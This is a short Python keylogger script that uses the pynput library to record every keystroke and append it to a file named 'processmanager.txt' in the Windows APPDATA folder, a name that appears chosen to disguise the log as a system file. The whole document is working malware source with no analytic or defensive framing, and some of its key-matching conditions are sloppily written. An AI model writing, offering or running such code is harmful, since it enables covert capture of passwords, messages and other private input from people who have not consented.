import os
import subprocess
from pynput import keyboard
from pynput.keyboard import Listener
path = os.environ['appdata'] +'\\processmanager.txt'
def write_file(key):
    with open(path,'a') as f:
        k=str(key).replace("'","")
        if k.find('Backspace')>0:
            f.write('Backspace')
        elif k.find('enter')>0:
            f.write('\n')
        elif k.find('space')>0:
            f.write(' ')
        elif k.find('caps_lock')>0:
            f.write('caps_lock')
        elif k.find('ctrl')>0:
            f.write('Ctrl')
        elif k.find("Key"):
            f.write(k)
try:
    with Listener(on_press=write_file) as listener:
        listener.join()
except KeyboardInterrupt:
    exit(0)
